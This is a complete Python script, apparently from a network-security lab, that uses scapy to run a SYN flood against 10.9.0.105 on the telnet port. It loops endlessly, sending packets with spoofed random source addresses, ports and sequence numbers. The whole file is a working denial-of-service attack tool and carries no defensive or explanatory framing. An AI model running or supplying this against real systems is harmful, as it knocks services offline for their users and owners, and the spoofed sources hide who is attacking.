#!/usr/bin/env python3
from scapy.all import IP, TCP, RandShort, send
from ipaddress import IPv4Address
from random import getrandbits
import time

def send_syn_flood():
    try:
        print("Starting SYN flood attack against 10.9.0.105...")
       
        while True:
            # Create fresh packet each time
            packet = IP(
                src=str(IPv4Address(getrandbits(32))),  # Random source IP
                dst="10.9.0.105"  # Target IP
            )/TCP(
                sport=RandShort(),  # Random source port
                dport=23,  # Target port (telnet)
                seq=getrandbits(32),  # Random sequence number
                flags="S"  # SYN flag
            )
           
            # Send without verbosity and immediately
            send(packet, verbose=0, loop=0)
           
    except KeyboardInterrupt:
        print("\nAttack stopped by user")

if __name__ == "__main__":
    send_syn_flood()
